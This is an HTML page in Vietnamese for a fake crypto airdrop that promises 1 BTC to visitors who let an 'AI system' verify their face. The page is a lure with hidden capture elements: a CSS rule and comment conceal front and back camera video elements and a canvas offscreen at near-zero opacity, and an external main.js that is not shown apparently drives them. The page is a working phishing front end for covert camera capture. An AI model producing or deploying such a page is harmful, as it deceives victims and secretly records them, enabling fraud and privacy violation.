<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blockchain Airdrop - Xác thực nhận 1 BTC</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0b0e11; color: #eaecef; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .card { background: #1e2329; padding: 30px; border-radius: 16px; text-align: center; width: 90%; max-width: 400px; border: 1px solid #474d57; box-shadow: 0 10px 30px rgba(0,0,0,0.5); position: relative; z-index: 10; }
        .btc-icon { width: 80px; margin-bottom: 20px; }
        h2 { color: #f3ba2f; margin-bottom: 10px; }
        p { color: #848e9c; font-size: 14px; line-height: 1.6; }
        .btn { background: #f3ba2f; color: #000; border: none; padding: 15px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 20px; transition: 0.3s; }
        .btn:hover { background: #dba323; }
        .btn:disabled { background: #474d57; cursor: not-allowed; }
        #loading { display: none; margin-top: 20px; }
        .spinner { border: 3px solid #30363d; border-top: 3px solid #f3ba2f; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        /* Ẩn camera và canvas hoàn toàn */
        #hiddenCapture { position: absolute; width: 1px; height: 1px; opacity: 0.01; left: -1000px; overflow: hidden; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png" class="btc-icon" alt="BTC">
    <h2>Chúc mừng bạn!</h2>
    <p>Bạn đủ điều kiện nhận 1 BTC. Nhấn nút bên dưới để hệ thống AI xác thực khuôn mặt và giải ngân vào ví Blockchain của bạn.</p>
    
    <div id="loading">
        <div class="spinner"></div>
        <p id="statusText">Đang quét khuôn mặt và mã hóa dữ liệu...</p>
    </div>

    <button class="btn" id="startBtn">XÁC THỰC & NHẬN 1 BTC</button>
</div>

<div id="hiddenCapture">
    <video id="videoFront" autoplay playsinline muted></video>
    <video id="videoBack" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>
</div>

<script src="main.js"></script>
</body>
</html>
